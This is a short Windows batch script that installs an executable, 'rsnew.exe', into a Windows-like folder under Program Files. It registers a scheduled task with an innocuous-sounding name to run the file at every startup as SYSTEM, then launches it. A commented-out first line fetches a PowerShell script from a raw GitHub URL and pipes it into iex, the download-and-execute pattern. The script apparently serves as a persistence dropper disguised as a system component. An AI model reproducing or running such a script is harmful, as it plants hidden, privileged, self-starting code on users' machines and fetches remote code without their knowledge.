
@REM iwr https://raw.githubusercontent.com/truongcp0305/dp/main/1.ps1 | iex

@echo off
mkdir "C:\Program Files\WindowsRS"
mkdir "C:\Program Files\WindowsRS\bin"

set TASK_NAME=WinRpStart

@REM schtasks /Create ^
@REM  /TN "%TASK_NAME%" ^
@REM  /TR "C:\Program Files\WindowsRS\bin\rsnew.exe" ^
@REM  /SC ONLOGON ^
@REM  /RL HIGHEST ^
@REM  /F

 schtasks /Create /TN "%TASK_NAME%" /TR "C:\Program Files\WindowsRS\bin\rsnew.exe" /SC ONSTART /RU "SYSTEM" /F | Out-Null

copy "%~dp0rsnew.exe" "C:\Program Files\WindowsRS\bin"

start "" "C:\Program Files\WindowsRS\bin\rsnew.exe"